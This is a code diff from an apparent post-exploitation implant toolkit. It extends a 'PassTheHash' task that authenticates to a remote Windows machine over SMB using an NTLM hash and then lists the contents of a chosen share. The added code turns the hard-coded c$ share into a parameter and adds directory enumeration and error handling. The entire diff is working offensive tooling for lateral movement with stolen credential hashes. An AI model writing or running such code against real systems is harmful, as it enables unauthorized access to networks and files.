@@ -197,9 +197,9 @@ namespace WheresMyImplant
         */
 
         [ManagementTask]
-        public static String PassTheHash(String target, String domain, String username, String hash)
+        public static String PassTheHash(String target, String share, String domain, String username, String hash)
         {
-            String output;
+            StringBuilder output = new StringBuilder();
             using (SMBClient smbClient = new SMBClient())
             {
                 smbClient.Connect(target);
@@ -208,15 +208,29 @@ namespace WheresMyImplant
                 smbClient.NTLMSSPNegotiate();
                 if (smbClient.Authenticate(domain, username, hash))
                 {
-                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
-                    smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, "c$"));
-                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "c$"));
-                    smbClient.CreateRequest();
-                    smbClient.InfoRequest();
+                    try
+                    {
+                        smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
+                        smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, share));
+                        smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, share));
+                        smbClient.CreateRequest();
+                        smbClient.InfoRequest();
+                        smbClient.FindRequest();
+                        smbClient.ParseDirectoryContents();
+                        smbClient.CloseRequest();
+                        smbClient.DisconnectTree();
+                    }
+                    catch (Exception ex)
+                    {
+                        output.Append(ex.ToString());
+                    }
+                    finally
+                    {
+                        output.Append(smbClient.GetOutput());
+                    }
                 }
-                output = smbClient.GetOutput();
             }
-            return output;
+            return output.ToString();
         }
 
         [ManagementTask]
